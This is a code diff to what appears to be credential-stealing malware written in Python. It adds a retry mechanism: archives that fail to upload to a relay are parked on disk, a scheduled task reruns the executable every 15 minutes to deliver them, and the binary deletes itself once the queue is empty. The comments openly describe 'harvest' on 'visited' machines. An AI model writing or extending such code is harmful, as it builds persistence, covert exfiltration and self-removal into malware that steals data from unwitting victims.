@@ -22,6 +22,10 @@ from typing import Final
 
 UNWRAP_FLAG: Final[str] = "--abe-unwrap"
 DEBUG_FLAG: Final[str] = "--debug"
+# What the retry task passes. A run with this flag delivers what an earlier run parked
+# and then leaves; it never collects, so a repeating task cannot turn into a repeating
+# harvest on a machine that has already been visited.
+RETRY_FLAG: Final[str] = "--retry"
 
 
 def _summary() -> dict:
@@ -87,6 +91,22 @@ def main(argv: list[str] | None = None) -> int:
         except Exception:
             logger.exception("config rejected")
             return 1
+
+        # A previous run that could not reach the relay parked its archive. Clearing that
+        # first is the whole point of the queue: the result already exists, and collecting
+        # a second one on top of it is work nobody asked for.
+        waiting = relay.drain(cfg)
+        if waiting:
+            logger.debug("queue: %d archive(s) still waiting", waiting)
+            relay.notify(cfg, _status("", f"queue · {waiting} still waiting"))
+        else:
+            util.cancel_retry()
+
+        if RETRY_FLAG in args:
+            logger.debug("retry pass: %d still waiting", waiting)
+            if not waiting and cfg.self_remove:
+                util.self_remove(util.executable_path())
+            return 0
 
         # Gathered before anything that can fail, so the first message carries the
         # machine rather than a promise that one is coming.
@@ -181,9 +201,20 @@ def main(argv: list[str] | None = None) -> int:
                 relay.transmit(cfg, shipped, summary)
             except Exception as exc:
                 logger.exception("transmit failed")
+                # Park before reporting: the archive is the whole run, and the temp
+                # folder it was built in does not survive a reboot. The task brings this
+                # image back every 15 minutes until the queue is empty, then removes
+                # itself; the image stays on disk only while something is waiting.
+                parked = util.park_archive(shipped)
+                if parked is not None and util.schedule_retry(util.executable_path()):
+                    where = "parked · retrying every 15 min"
+                elif parked is not None:
+                    where = f"parked {parked.name} · no task"
+                else:
+                    where = "nothing parked"
                 relay.notify(
                     cfg,
-                    _status(block, f"transmit failed · {exc} · gate {gate_note}"),
+                    _status(block, f"transmit failed · {exc} · gate {gate_note} · {where}"),
                     alert=True,
                 )
                 return 1
